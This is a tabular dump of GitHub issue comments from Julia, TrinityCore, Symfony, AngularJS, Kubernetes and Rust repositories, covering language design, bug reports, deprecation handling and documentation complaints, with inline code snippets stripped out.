julia/JuliaLang/4935/47933338,4935,"@friend It is true that it is not such a good measure how often something comes up on the mailing list. Abstract multiple inheritance is something where no simple workaround is available and which is quite standard in other ""interface"" languages such as Java and C#. Further, there are some packages where this was/is really needed but the discussions where not on the mailing list but on github issues. After all we can duck-type as a valid workaround which leaves all type checking out however. But anyway, I am not a core dev and just wanted to convince you that the lack of abstract fields with types can be easily emulated with simple means and without cluttering the code. But since you are not convinced maybe the best way to get this in is to prepare a PR that implements this. I would vote for merging it in the case that overloading field access will stay unpossible. ",,False
julia/JuliaLang/4935/53883831,4935,This seems to have been fairly well-exhausted with the consensus leaning towards not having it. Objections to closing? ,,False
julia/JuliaLang/4935/53897445,4935,"It was my understanding that it was still under consideration, just not necessarily in the near future. That might also just be wishful thinking. ",,False
julia/JuliaLang/4935/54823028,4935,"I wrote a quick macro to do abstract types with fields on the user-side  very simple, and could probably use more work, but I think it's argument for not introducing 'Abstract Types with Fields' into the language directly (at least for now). If people want the feature, they can use it, and if it's considered useful enough, it's possible to reconsidered for inclusion into the language. On a side note, it would be nice if extra syntax was allowed for macros. Currently to use the macro you have to do It would look more seamless (and perhaps help testing new features) if I could write ",,False
julia/JuliaLang/4935/54824685,4935,"will work fine. Choose whatever macro name you want, of course. This is the approach we take in StrPack. ",,False
julia/JuliaLang/4935/57919498,4935,"No problem--what you've done looks pretty similar to what StrPack does now, in fact. ",,False
julia/JuliaLang/4935/278174674,4935,I guess with #20418 we could now consider ,,False
TrinityCore/TrinityCore/15489/105922836,15489,"Level 1 hunter, cannot equip weapons Troll Shaman Quest Proving Pit  to the Darkspear Jailor and nothing happens, quest is no initiated in the pit therefore it cannot be completed. ",,False
TrinityCore/TrinityCore/15489/139416563,15489,This issue is not considered valid because of the following reasons  No proper commit hash (revision)  Please read  . Thanks. ,,False
TrinityCore/TrinityCore/15489/139416700,15489,TBD 602 Rev 59eff3f This bot is rediculous lol ,,False
TrinityCore/TrinityCore/15489/139418955,15489,don't post multiple issues on one ticket. search before posting tickets. (duplicate) ,,False
TrinityCore/TrinityCore/15489/139694094,15489,"@friend ; the bot is not ridiculous, it points out that the first post of your issue is not properly written. If you don't follow the TC guidelines on how to post an issue, this is one of the consequences. ",,False
TrinityCore/TrinityCore/15489/139723824,15489,"its closed with Aokromes making his usual attitude and I am holier than though apprach, let it be that way. TC has been rushed and devs dont give a shit about us trying to learn ",,False
TrinityCore/TrinityCore/15489/139726625,15489,"Well, that is what I used to feel myself, especially regarding my own issues when posting a year ago. Seeing his comment today, from an outsider's viewpoint, his comment is neutral, short and to the point. ",,False
TrinityCore/TrinityCore/15489/139727083,15489,"well Ive searched for the issues that I have found on my 6x server, no answers no fixes, nothing yet I get told to search or go to this thread or that thread and yep, already been there and nope it doesnt fix a thing. How about they just own up to the fact that a start area is bugged or a a class is bugged and fix it rather than trolling forums or github trashing the novices. Tis the trouble with online communites, those who think that they are god and those who genuinely want to learn. I will wait patiently until 6x gets a lot more mature before I even try to play with it again. ",,False
TrinityCore/TrinityCore/15489/139739092,15489,"Your issues (2 issues) in the first post are duplicates. Example search  issues you can follow to see the progression on issue fixes [Quest] Proving Pit #11706  Fixed equip ranged weapons (Guns, throwns etc..) #14493  Hunter bug 6.x #15296 ",,False
TrinityCore/TrinityCore/15489/139842493,15489,"ok finally got it so hunters can equip, wondering why it doesnt give the hunter a cross bow or  a bow on initial load ",,False
symfony/symfony/27936/340886172,27936,"This RFC was prompted by the recent deprecations in various Doctrine projects, which now make some peoples' tests fail (example  For a Symfony project, the default value for the deprecation handler should be , not  - any deprecations within vendors are not within the scope of the application and thus shouldn't make tests fail. With Symfony Standard Edition being deprecated and Symfony Flex being the new Gold Standard (™️) I wasn't sure where to bring this up, so I thought I'd just ask around here. Would you be in favor for a change like that, and where would we make it? ",,False
symfony/symfony/27936/404868364,27936,"I've always been quite skeptical with weak_vendor mode. My reasoning is that you call the vendor code, so in the end there is no such thing as vendor-only deprecations. The example here is a good one thanks to the default mode, we identified quite early that Doctrine was in ""WIP"" state. Without this early notice, it could have been left unidentified for much longer, thus fixed much later. I think the current default encourages a constructive open-source attitude instead of having a ""not my fault"" attitude, it encourages ppl to own their vendor. That also works on Symfony since we decided to build on top of Doctrine, we own a responsibility here also and keeping eyes actively open on the project is vital for the ecosystem. ",,False
symfony/symfony/27936/404880331,27936,"Can you please explain what exactly was WIP there? Two new silent () deprecations appeared in dev version, for two classes deprecated ~6 years ago, and some more using phpDoc annotation . Although I agree that in the ideal situation the usage of deprecated classes shouldn't have existed by the time, I disagree with your actions regarding #27609 (the revert + discussion) where you discarded the work solely because of not-yet-migrated usage coming from a yet another development version. Yes. And everything would work as before. It's not a bug, using deprecated API doesn't inherently break anything and the deprecated API stays in place until end of minor version (semver-compatible approach). This is not relevant to whether  is / should be default or not, you can opt in for such behavior regardless. The deprecations using  are called opt-in, but with your assumptions, you are actually making opt-in deprecations opt-out. Sadly this completely breaks the original concept of _opt-in_ness - these deprecations are no longer opt-in since you force everyone to opt-in and comply. In the end what you are saying is in contradiction with Symfony's converntions I agree it's everyone's responsibility to keep an eye on the vital state of their dependencies. I agree it's a common interest to forward any breakages / incompatibilities / bugs to the maintainers of the dependencies in question as soon as discovered. I do not agree that silent/phpDoc deprecations should be something covered by any of these. Which brings me back to ♠@friend_vendors`, there is still a notice for deprecations happening in vendors.) ",,False
symfony/symfony/27936/404931053,27936,"@friend usage of the listener reporting deprecation and making tests fail for them is the opting in. This listener is optional, and deprecations are not making the testsuite fail if you don't have it. ",,False
symfony/symfony/27936/404935867,27936,"Is it really though? Only having the package installed seems it gets enabled automagically in the report everything mode  installed it in a project without previously having the bridge (try yourself on doctrine/orm2.6 for example), didn't change phpunit.xml at all, but  suddenly ends with exit code 1 and summary of deprecations. ♠composer create-project symfony/website-skeletonsymfony/phpunit-bridge` automatically. This is not opt-in. ",,False
symfony/symfony/27936/404939970,27936,This should be considered on the recipe for the bridge I suppose. ,,False
symfony/symfony/27936/405026645,27936,"There should absolutely be no such thing, but unfortunately, it turns out people make mistake, and both the caller and the callee (which triggers) will be in the same Composer package.  was made to help libraries avoid that kind of mistake, which results in ""unfixable deprecations"". ",,False
symfony/symfony/27936/406898585,27936,"As I understand, the only way to silence these errors is to use an environment var , but I have opened as issue as this still doesn't silence them as it appears that during simple phpunit bootstrap, getenv is not able to access the  vars - ",,False
symfony/symfony/27936/407143521,27936,"I was not sure what  meant, but now that I checked the code and chatted a but with @friend, I pretty confident we should not do this  ignores any deprecations thrown by any vendor; it keeps only deprecations thrown by your own . That's not something apps should do. For libs, it may make sense of course. For this reason, I'd be -1. ",,False
symfony/symfony/27936/407184924,27936,"After a constructive discussion on Slack with @friend, I updated my understanding of the topic. What want here is that their CI don't fail on deprecations. While this lowers the urge to contribute fixes to vendors that trigger their deprecations, this may be more compatible with daily job tasks. So here we are  doesn't use  because this mode is meant for libs. Instead it uses a maximum number of deprecations. But the end result is similar the CI won't fail by default, but the deprecation summary will still be printed. ",,False
symfony/symfony/27936/411973749,27936,I believe the solution implemented now is a good compromise. People can still complain about the deprecations or (ideally) fix them upstream without the deprecations disrupting their daily workflow. Thanks @friend! ,,False
angular.js/angular/1438/7334618,1438,"The sample code for  is broken. See the first comment for a fix     You must reference the angular-resource js script file.    Then you must declare a module dependency on     'ngResource' via angular.module('myapp', ['ngResource']). ",,False
angular.js/angular/1438/9641795,1438,This URGENTLY needs to be fixed.  People keep getting stuck on this issue. ,,False
angular.js/angular/1438/9801367,1438,"Yeah, count one more person who wasted time on this. You can eventually figure it out by searching around the net and reverse engineering other peoples code ) ",,False
angular.js/angular/1438/10660313,1438,"plus one, just lost an hour wondering about this too. ",,False
angular.js/angular/1438/10921627,1438,Ran headfirst into this one as well. ,,False
angular.js/angular/1438/11217132,1438,plus one me too. Thanks ,,False
angular.js/angular/1438/11394570,1438,It's open issues like this that make me wonder if I should continue developing with Angular. I mean this with 100% respect for what you all have accomplished here.  I'm just trying to point out that documentation is really important for people like me who are trying to choose which framework to use. ,,False
angular.js/angular/1438/11410346,1438,Fork. Branch. Fix. Pull request? ,,False
angular.js/angular/1438/11411523,1438,"So, had a look at this example and it is broken in number of ways, in addition to the ones already listed  It is still using old controller syntax ( instead of ) We are missing a module with a resource created in a factory Google buzz is gone ( so the example must be changed anyway  I don't know, if there are no other ideas we could simply change it to the projects list from the home page.. ",,False
angular.js/angular/1438/11993003,1438,why are you doing this to us? ,,False
angular.js/angular/1438/12001717,1438,Angular.js has over 700 closed pull requests. Just saying. ,,False
angular.js/angular/1438/12001867,1438,but this is really urgent. I couldn't find any advanced example for $resource. ,,False
angular.js/angular/1438/12006311,1438,Normally I agree with the philosophy if you find a problem why not propose a solution. However this is one of the first things people new to angular are trying to grok. They are thinking more WTF rather than how can I fix this.  Let them get through hello world before expecting pull requests. ,,False
angular.js/angular/1438/12033240,1438,"I went through hello world 6 months ago. I have made 3 productive angular apps, yet I spent a full day trying to figure out how $resouce works basically. WTF ",,False
angular.js/angular/1438/12038315,1438,"@friend @friend I sympathise completely, it's always fair to raise a ticket to ask an expert to fix a problem. What's not fair (or helpful) is the attitude that ""WTF"" conveys. This is free software, built with the time and creative energy of individuals who ask for nothing in return. They deserve a little better than ""WTF"", don't you agree? When I hear that attitude my gut reaction (that I do usually restrain) is ""fix it yourself"". ",,False
angular.js/angular/1438/12038439,1438,I apologize. I was unrightfully  provoked. Sorry! ,,False
angular.js/angular/1438/12044431,1438,"Yes Richard you are right. I guess a bit of frustration comes from not having more access to what the core team is thinking.  Not for our curiosity but because it would help us plan ways to help the project.  Are any if the core team working full time on Angular?  (if they have only 10% allocation we can optimize our help for this)  What are they currently working on or starting in the near future?  (sparse commits and roadmap don't tell much)  How do we contact them?  Does Igor list his email?  I am trying to help fix a bug in the core code and need to coordinate but haven't gotten a response via GitHub or google groups.   Leaders of a free project do deserve our respect and thanks.  The flip side is they have to spend time on communication, coordination, and leadership, or delegate it.  The more the path is lit the more the community can help. On Jan 9, 2013, at 414 AM, ""Richard Marr"" notifications@friend.com wrote ",,False
angular.js/angular/1438/12045657,1438,Fair enough! ,,False
angular.js/angular/1438/12081539,1438,Something as basic as $resource should be properly documented. WTF is the appropriate reaction. Fixing it yourself is too. ,,False
angular.js/angular/1438/12198587,1438,"I would like to contribute more appropriate documentation and samples, but I couldn't figure how to make the sample code pipeline work. On Wed, Jan 9, 2013 at 942 PM, Iwein Fuld notifications@friend.com wrote ",,False
angular.js/angular/1438/12208705,1438,"kmayer cool! What do you mean by ""how to make the sample code pipeline work""? Is it related to the Angular build, or to the code that is in the current sample? I think that you can best ask in the mailing list, there is quite a bit of activity there. ",,False
angular.js/angular/1438/18803220,1438,This should have been closed 3 months ago together with Pull Request #2099 . Here an screenshot showing this info on the current docs of ngResource.$resource    ,,False
angular.js/angular/1438/23198797,1438,"As part of our effort to clean out old issues, this issue is being automatically closed since it has been inactivite for over two months. Please try the newest versions of Angular ( and ), and if the issue persists, comment below so we can discuss it. Thanks! ",,False
julia/JuliaLang/1374/7561352,1374,"As I understand it,  is supposed to return an in-place  it outputs such a type, but its value stays as . Also, only the upper diagonal elements are changed, the lower diagonal elements are those of the original matrix. ",,False
julia/JuliaLang/1374/9404206,1374,"It's not possible to change the type of something in-place, so the behavior expecting isn't actually feasible. Perhaps this is an indication that  simply shouldn't exist since its behavior can't be made to match that of its non-in-place counterpart. ",,False
julia/JuliaLang/1374/9404212,1374,cc @friend ,,False
julia/JuliaLang/1374/9404655,1374,"""its value stays as an array"" CholeskyDense is a composite of two objects, and Array and a Bool. In that output, you're seeing those two components (note the ""true"" at the end). What's possibly confusing is that that CholeskyDense is designed to act as a decomposition of A, in other words be interchangeable for A when used in linear algebra. For example In other words, this test shows that it's working as intended. If you want the Cholesky factor, used factors(C). Or just call chol(C). ",,False
julia/JuliaLang/1374/9404680,1374,"Ah, clever. So the  version basically uses the input array as a computational scratchpad but returns the decomposition still. ",,False
julia/JuliaLang/1374/9404856,1374,I get the decomposition thing---that's really quite useful---I guess I just expected  to have the same result as . ,,False
julia/JuliaLang/1374/9405303,1374,"I see your point, and it's a good one. (It took me a little to understand that was probably your thinking, sorry about that.) But as Stefan said, it's not possible. I guess ! also means ""caution!"" in this context -). ! is actually pretty ambiguous some functions have ""dummy"" inputs that really serve as outputs, for others (like sort!) they are genuine inputs and the output is returned in them, and yet others just use their inputs as scratch space. I have wondered about using chold!! on occasion, but in the end any naming convention will break down for functions that have multiple inputs and do different things to them. I just noticed that your comments also point out that chold! is not quite working in place. The call to Lapack is in-place, but then it's calling triu or tril which creates a new matrix. So we have the worst of all worlds, it destroys the input but it also allocates a new matrix, which therefore doesn't really represent a savings. I just pushed a fix for this issue. ",,False
julia/JuliaLang/1374/9405559,1374,"So does that mean  won't need to create a new array in memory? If so, that's very handy. ",,False
julia/JuliaLang/1374/9405732,1374,Correct. ,,False
julia/JuliaLang/1374/9405753,1374,"Indeed, I should say that C = chold!(A, true) also doesn't create a new array in memory. I would be tempted to rename it. I'm not sure (others could tell you with certainty), but I wonder if having variables change type in the middle of a function is less-than-ideal programming practice from the standpoint of making life easy on the compiler. ",,False
julia/JuliaLang/1374/9406643,1374,"It depends. If  is just an identifier, in  you're binding something new to it so it's as if you've really called it  and you call it that for the rest of its scope (which if I understand correctly is conversion to a static single assignment (SSA) representation.) Compilers figure that out. This is different than mutating the value of  into something with a different type, which is what the hypothetical side-effectful  would have to do. As Stefan mentions, that can't be done, since the type of a value can't be changed. Note that I was very careful to completely avoid the word ""variable."" ",,False
julia/JuliaLang/1374/9476117,1374,An alternative would be to use a type to indicate that an object is allowed to be destroyed The exclamation mark could then be reserved for functions that do in-place modifications such as . ,,False
julia/JuliaLang/1374/9491984,1374,"That's not a bad idea. I'm a bit used to knowing that ! means I'd better read the documentation on a function, so I don't think this is essential, but it might mean fewer trips to the docs. That certainly has merit. What do others think? ",,False
julia/JuliaLang/1374/9494107,1374,"My attitude was much like yours, @friend.  The  in the function name is a sign of danger in that the function can modify its arguments.  That's why almost all the functions in the Blas and Lapack modules have names ending in . To me it is a sign to the casual user that such functions should be avoided.  The expert user who has read the docs can employ such functions to overwrite arrays thereby saving storage and enhancing performance but they should not complain about subtle bugs in their code introduced by the contents of arrays being changed. So I think that the  means, ""you better read the docs carefully before using this function"". ",,False
julia/JuliaLang/1374/9518137,1374,"Yes, I think you're right about the  indicating danger, and hence requiring the user to read the documentation. But not all functions that destroy their arguments do (and can) have exclamation marks (Although maybe this example is a bit far-fetched.) ",,False
julia/JuliaLang/1374/9527605,1374,"Right. That's a different but related convention, which is that when you give constructors an array, they ""own"" it. Of course, this is to avoid having to make copies of everything, but it can definitely be a usability issue. ",,False
julia/JuliaLang/1374/9532888,1374,"As an inner constructor the function  must have the same name as the type so the only way to insert a  in the name is to change the name of the type as well.  Although we expect that it will be very rare to call the inner constructor for a templated class directly, all the other constructors do end up calling the inner constructor eventually.  Thus we are left with the option of mangling the name of the type, potentially confusing some users, or forcing a copy of the argument in the inner constructor.  The latter choice would mean that all such objects would cause a copy of the matrix, which is a situation I would like to avoid.  I would prefer to provide the ability to modify the array in place if the programmer so chooses. All the Factorization types eventually call Lapack subroutines to generate the decomposition.  These subroutines always overwrite some of their arguments, hence the option for overwriting is available.  Saving memory allocation and garbage collection by overwriting is not important when dealing with arrays with tens or hundreds of elements.  It is important when dealing with arrays having tens or hundreds of millions of elements.  I write code that performs iterative optimization of parameters in models that can have matrices of this size in their representation and these arrays need to be updated at each evaluation of the objective function.  I really want to do that updating in place.  In fact, in the R code for these models that I currently have available, I go to a lot of trouble and complication linking compiled code with R code and passing objects that should not be modified but are, exactly to allow for in-place updating.  In early versions of that code (the lme4 package for R) users had the experience of getting models fit and then having R fail because it is unable to allocate memory to construct the object to be returned from the model-fitting function.  In other words, the results were calculated but could not be returned because of a copy operation. They weren't happy. ",,False
julia/JuliaLang/1374/9534620,1374,"I think David's point is that you could, if you chose, have the following behavior CholeskyDense{Float64}(A, true) makes a copy of A (so doesn't destroy it). In contrast, CholeskyDense{Float64}(destroy(A), true) does not copy of A, because you've marked A as being something you don't care about preserving, and uses A for its storage of the decomposition. However, I agree with Stefan it's probably a good convention that when you pass things to a constructor, you're passing control of them to the new object. I think I follow that pretty naturally in my coding, but I suppose this is yet another chance to ask whether we need more documentation. ",,False
julia/JuliaLang/1374/9557421,1374,"@friend, that's indeed what I meant. The convention of passing control of the arguments in a type constructor to the type does seem to make a lot of sense, however. Adding Destroy methods everywhere would probably be too verbose. ",,False
julia/JuliaLang/1374/9596793,1374,"If I have a triangular matrix, is there a way to construct a  instance? As I understand it, the constructor only accepts the full matrix, and then computes the Cholesky decomposition. But what if I already have the Cholesky decomposition computed? This could be useful for sampling from Wishart (and inverse Wishart) distributions, which can be done via a Bartlett decomposition. ",,False
julia/JuliaLang/1374/9602393,1374,"@friend At present the  constructors perform the decomposition.  You could always create a  object of the appropriate size as, say,  then replace the matrix as Actually, now that I think of it there is no need to match the size of the matrix used to create Lapack.potrs!♠ directly if you want to solve systems of the form LL'x=b ",,False
julia/JuliaLang/1374/9602505,1374,"@friend Regarding adding Destroy methods everywhere, I think it make much more sense to call  than to try to do a lot of gymnastics within a function to have  work. ",,False
julia/JuliaLang/1374/9602861,1374,"@friend Thanks. You can actually call , and then replace it with a larger matrix to save having to compute the Cholesky of the identity. However, perhaps it would be better if the constructor for  didn't compute the Cholesky at all i.e. calls to  would take the triangular matrix as the argument. You could transfer the computation to the  function, or use ? This would have the benefit of being consistent with some of the other  types, such as  and . ",,False
julia/JuliaLang/1374/9602914,1374,"Actually, I just realised  isn't a subtype of  why is that? ",,False
kubernetes/kubernetes/56026/275206867,56026,"Is this a BUG REPORT or FEATURE REQUEST? /kind bug /area hw-accelerators /sig node What happened When re-writing the endpoint code I discovered that the mutex logic is wrong and can lead to a data race while calling the  function. The current logic is a bit convoluted and would make more sense if the map was created in the for loop. However it seems like once the map is assigned to the structure, a device update while calling the  function will lead to a data race, Anything else we need to know? cc @friend ",,False
kubernetes/kubernetes/56026/345571373,56026,"Not quite sure about the race scenario you described, which func do you mean by  function ? The  ? ",,False
kubernetes/kubernetes/56026/345783837,56026,"Did you mean manager.Devices by ?  map is being assigned to  structure with locking protection only. Did you want to say that a race will happen if  is being updated and at the same time  gets invoked? If yes, i dont think so. At both the places, first endpoint.mutex lock is taken. So only one can run at a time and other will wait on mutex. Please let me know if i mistaken something. ",,False
kubernetes/kubernetes/56026/345876157,56026,Sorry I meant  essentially though the manager.Devices function calls the endpoint.getDevices(). Yes thanks for clarifying this. ,,False
kubernetes/kubernetes/56026/352045327,56026,I believe we all agree that there is no race in the scenario described in the description of this issue. Shall we close this issue? ,,False
kubernetes/kubernetes/56026/352048547,56026,@friend there is a race I think I didn't fully read your answer at the time sorry. Because the way maps works when replacing the map in the structure I am now making the Endpoint's map to the local copy of . Which means that every time we lock in the  function we might be changing that copy underneath. ,,False
kubernetes/kubernetes/56026/352392486,56026,@friend thanks! I got confused b/w call-by-value and call-by-reference and forgot that in golang maps are call by reference. ,,False
rust/rust-lang/44524/257144780,44524,"This is a tracking issue for the RFC ""In-band lifetime bindings"" (rust-lang/rfcs#2115). Steps  [ ] Implement the RFC (cc @friend/compiler -- can anyone write up mentoring instructions?) [ ] Adjust documentation (see instructions on forge) [ ] Stabilization PR (see instructions on forge)  Unresolved questions  Is a lint for enforcing multi-character lifetime names in impl headers worthwhile?  ",,False
rust/rust-lang/44524/328950131,44524,"@friend Could we word the unresolved question as something like ""what is the appropriate convention, if any"" rather than ""is this particular convention worthwhile""? Thanks! ",,False
rust/rust-lang/44524/328953287,44524,"also, that wasn't the only suggested alternative. There is also completely explicit lifetimes using ",,False
rust/rust-lang/44524/328955959,44524,"This lint is going to require updating a lot of code, including all of our docs and examples. I guess you could just do  but that seems to miss the point. Could we make some kind of interactive rustfix tool to let you choose new lifetime names and have them automatically updated? ",,False
rust/rust-lang/44524/328968029,44524,"@friend Done, thanks! ",,False
rust/rust-lang/44524/328981508,44524,I expanded the unresolved question a bit. ,,False
rust/rust-lang/44524/329008971,44524,On the shadowing issue would it be acceptable to simply disallow the shorthand when there are lifetimes in enclosing scopes? ,,False
rust/rust-lang/44524/330299910,44524,"(Partiall) mentoring instructions I'm not sure 100% the best way to implement this yet, but let me start by giving some pointers. Perhaps @friend can elaborate, as he is the last one to touch the relevant code in a serious way, as far as I know. First thing is a kind of list of what the tasks are in the RFC. This is roughly the order in which I think we should approach them. It may even be worth breaking this out into  [ ] Implementing . [ ] Lint against single-use lifetimes (they should be replaced with ). [ ] Enable implicit binders. [ ] Apply to rustc, experimenting with naming conventions (e.g., working through the affect on rustc).  I don't have time for detailed mentoring notes, but here are a few things to start reading into. At present, region resolution etc kind of works like this  During HIR lowering, we insert placeholders for elided lifetimes. After HIR lowering, we run the code in .  This creates the  that, for each , contains a  struct indicating what region is being named. This struct is a bit complicated. =)    ",,False
rust/rust-lang/44524/330352095,44524,To support  we have to do very little  treat it like the existing placeholder lifetimes in  remove the error for literally using  as a lifetime  ,,False
rust/rust-lang/44524/346608704,44524,"Sorry that I come “after the battle” (this RFC was accepted during the pre-impl-period rush), but as @friend pointed out applying this lint to existing code bases will likely generate a lot of busy work for questionable benefits. I looked for the rationale for this lint but couldn’t find it.  mentions a “convention”, but doesn’t say why enforcing it is important enough to warn by default. We don’t have such a lint for local variable names or field names, for example. I assume that proposed lints are intended to warn by default. If they’re silent by default I have no concern. ",,False
rust/rust-lang/44524/346744471,44524,"The idea is that there will no longer be  sections in functions, so it will be harder to tell apart lifetime names from  scope and those from function scope. This makes it tricky to know whether a name used in a function is intended to refer to an -scope lifetime, or to define a new one (and should thus be renamed). ",,False
rust/rust-lang/44524/346749516,44524,"@friend Sorry, I have a hard time figuring out if your comment is arguing for or against something, and whether that thing is the lint I mentioned or some other change proposed by this tracking issue. ",,False
rust/rust-lang/44524/346758955,44524,"@friend It's just trying to describe the reasoning behind the lint's existence, not necessarily argue for or against it. ",,False
rust/rust-lang/44524/346760900,44524,"Alright, I understand your previous comment now. I still think that while it might be good to nudge in that direction when writing new code, spewing hundreds of warnings in existing code bases is counter-productive. ",,False
rust/rust-lang/44524/351827005,44524,"What is the desired behavior for  in trait objects? Currently, it behaves just like elided lifetimes and is ignored. I think we want to change this. For example I would personally expect that the second and third versions would be equivalent. ",,False
rust/rust-lang/44524/366471309,44524,Could we upgrade the  lint to  when the  feature is turned on? ,,False
rust/rust-lang/44524/366471503,44524,"I think it should follow the same rules as all elisions in return types roughly, if there's only one input lifetime, match that one, if its a method, match the method receiver, otherwise, new lifetime. So yea, this example should be equivalent. ",,False
rust/rust-lang/44524/366550682,44524,"Unless they can only occur when using unstable features, please only enable new warnings after the alternative becomes available on the stable channel. (At least.) ",,False
rust/rust-lang/44524/366551009,44524,"@friend I'm not sure I understand you, but I think you're saying that we should not enable lints when you turn on a nightly feature unless the code being linted would not be possible without that nightly feature. Can you elaborate way? ",,False
rust/rust-lang/44524/366551631,44524,"I mean that Nightly should only warn ""Don’t do X, do Y instead"" once Y becomes available on the Stable channel. This is so that a project (for example a library) can choose to support all three release channels and be able to compile without warnings in all of them. An exception to that is if X was unstable, such that code that uses it could not build on Stable anyway. ",,False
rust/rust-lang/44524/366551800,44524,"@friend the intent is to turn the lint on when the feature is turned on (not on all nightlies). You can't have a feature turned on and compile on stable. I understand that when we stabilize the feature, we should not have the lint level follow it until the feature is actually in stable. ",,False
rust/rust-lang/44524/366551954,44524,"And this should be a minimum. If X is extremely common, consider only warning by default in a new epoch. It’s not nice when a large project suddenly starts emitting hundreds of warnings just by switching to a newer compiler. ",,False
rust/rust-lang/44524/366752952,44524,"@friend unfortunately, I think there are still some bugs we need to fix before we upgrade the lint. For example, I found that I was getting warnings in the  macro. I've been meaning to file an issue about that. ",,False
rust/rust-lang/44524/366797073,44524,Good to know. My reason for prioritizing upgrading the lint is that alexcrichton/futures-await#63 requires users to use  for lifetimes in paths for async functions. This is because we have to unelide lifetimes in a proc macro to add them to the  return type. It seems easier for people using this syntax to just move everything over than to have to use  sometimes and not other times. ,,False
rust/rust-lang/44524/367125980,44524,This is the problem I was talking about ,,False
rust/rust-lang/44524/368019707,44524,"I created a distinct tracking issue  for , which we aim to stabilize first. @friend, I also filed a bug regarding the behavior of `dyn Trait (and linked it from #48469). ",,False
rust/rust-lang/44524/371155760,44524,Am I wrong in assuming that we are just experimenting this feature since there are still concerns from the RFC thread? Or is this a feature that is very likely to get stabilized without overwhelming consensus? ,,False
rust/rust-lang/44524/371249607,44524,"That seems to be the case  the same time, though, features get stabilized without ""overwhelming consensus"" all the time. Rust language design isn't a popularity contest. ",,False
rust/rust-lang/44524/371421159,44524,"Nothing is a popularity contest. This does not mean users' legitimate concerns should get ignored in the discussion of a change that has significant impact on them. In the end of day though, team member still decide what to do and what not to do, and users continue to reply on team members' effort to produce useful things. And I personally feel torn between sounding confrontational possibly ungrateful and letting changes I think that may undermine a system language that focuses on correctness and promises boring stability slip through. ",,False
rust/rust-lang/44524/371533499,44524,"@friend Yes and no. I don't think that this feature has yet been evaluated, so that part I agree with. This is mostly due to general lack of bandwidth I would say. I am hoping that will change as get more organized about ensuring all the pieces of the upcoming Epoch (or era, edition, whatever) fall into place. Regarding the feature itself, I personally still feel quite positive about it. I've used it in a few small places and it felt very natural. But I wouldn't feel comfortable recommending or stabilizing it until (a) it is feature complete, (b) in use at least in rustc and ideally other places, and (c) there are effective lints that guide us down the expected path. That said, I do feel good about stabilizing  specifically, which more-or-less meets those criteria (still a bit of work to be done). ",,False
rust/rust-lang/44524/371699138,44524,"I've recently written rather a lot of code where implicit binders would have been rather nice... basically, I have a bunch of containers with methods like ",,False
rust/rust-lang/44524/371702133,44524,"@friend Isn't that one of the cases that elision handles, since  is single-use and the return is borrowed from ? ",,False
rust/rust-lang/44524/371850211,44524,"Sorry, bad example. It's more complicated when there are other lifetimes on the  type that you want some parameters tied to. Also, I can never quite remember when they can be ellided or what the inferred lifetimes are, so I find the explicit lifetimes convenient when it's not obvious. ",,False
rust/rust-lang/44524/385288803,44524,It looks like #48469 and #15872 are done tada  Could someone update the OP? ,,False
rust/rust-lang/44524/399601550,44524,"🔔 🔔 Note that an early 2018 Edition Preview is now ready, and includes in-band lifetimes. Please take a look and leave feedback here! ",,False
rust/rust-lang/44524/405362435,44524,"On discord recently, someone said And I'm able to confidently say, ""You don't need the "" and suggest With in-band lifetimes, if someone says I can no longer make that statement confidently. Has there been any further progress on how to apply this only in ways/places that doesn't potentially increase confusion?  My first instinct is something like ""cannot mix in-band and from-parent lifetimes"", but that still doesn't make the third code example earlier unambiguous... ",,False
rust/rust-lang/44524/405424571,44524,"I see this more as a style issue. If you are mixing parent and function lifetimes, I think you should not use in band lifetimes. In my limited experience, this mixing case is uncommon so the loss of ergonmics seems justified. ",,False
rust/rust-lang/44524/405428196,44524,"I think that this ship has sailed for other similar concepts. If there's a trait bound on the  block, you don't see it from the method. Whenever trait bounds are implicitly applied on the  block based on the type declaration, there will be even more ""action at a distance"". ",,False
rust/rust-lang/44524/405489909,44524,I think we should just add a lint already for one-use lifetimes. ,,False
rust/rust-lang/44524/405761976,44524,"How much has this feature been put into use in rustc at this point? That's one of the items listed in the OP, curious what the experience has been. ",,False
rust/rust-lang/44524/405800749,44524,"I'm happy to stabilise but not strongly so - I found in-band lifetimes to be of limited utility, iiuc the current design only lets us skip declaring a lifetime, so it just saves  or similar. I find the declaration necessary only rarely and when it is necessary it's usually a complex signature where the decl doesn't make too much difference. I didn't use the impls thing so much, but that sounds much more useful. ",,False
rust/rust-lang/44524/405812467,44524,"I don't think it's good to defend action-at-a-distance by saying there's already some in the language and we're (probably) going to add more. Lifetime annotations are really confusing, especially for newcomers, and making them harder to trace should be considered very carefully. ",,False
rust/rust-lang/44524/405813992,44524,As a clarifying question what was the decision on single-letter lifetimes in general? There are several unchecked boxes in the top post before stabilization and that's one of them. ,,False
rust/rust-lang/44524/405826949,44524,"Just to confirm something, do we already have the lint for ""you only used this lifetime once, so it's probably a typo""? I don't want to stabilize this without the typo-catcher. ",,False
rust/rust-lang/44524/405850532,44524,We could just make this a hard error requiring  to be used instead ,,False
rust/rust-lang/44524/405909842,44524,"@friend I definitely agree. From @friend's experience with #52461, I can say that this feature is really great at introducing lifetimes in an existing codebase, in positions where there were none, with very little friction, and all the footguns were single-use lifetimes. ",,False
rust/rust-lang/44524/405911675,44524,"@friend Sadly that's not the case at all in codebases where the lifetimes are part of the infrastructure, such as  in , which inverts the statistics for when you need certain lifetimes explicitly. I wish we could just make entire modules generic on lifetimes, but atm that's just fantasy. ",,False
rust/rust-lang/44524/406051438,44524,"Can anyone who's transitioned a codebase to in-band lifetimes post the link here, so we can see if it's easier or harder for others to read? ",,False
rust/rust-lang/44524/406051933,44524,I have ported my crate to Rust 2018 on a branch ,,False
rust/rust-lang/44524/406068106,44524,"If I explicitly declare a lifetime somewhere and mean to use it again but get the name wrong, it doesn't look like there's any way the compiler will be able to catch me.  For example, suppose I refactor to add an outer lifetime that happens to have the same name as an inner one--now it will silently be converted to the outer one.  Hopefully that will be nonsensical and the compiler will yell at me then, but if it makes a kind of sense, but not the sense that I intended, then it won't be caught; and even if I'm yelled at, I might not recognize the source of the problem unless I'm extremely solid on how lifetimes work. This makes me suspect that after a year or so, the conventional wisdom, backed up by linting tools, is going to be ""always declare lifetimes explicitly"". I think the anon lifetimes are great, but I'm nervous about this one. ",,False
rust/rust-lang/44524/406070117,44524,"Probably too late for bikeshedding, but it would be way safer if you could where  means ""the lifetime of "", which is syntactic sugar for the long version with lifetime parameters.  Yes, that drags you into dependent types, but I think it better matches the intent, is harder to get wrong, and is more lightweight syntactically (at least if you don't need to keep referring to the lifetime in the function body). ",,False
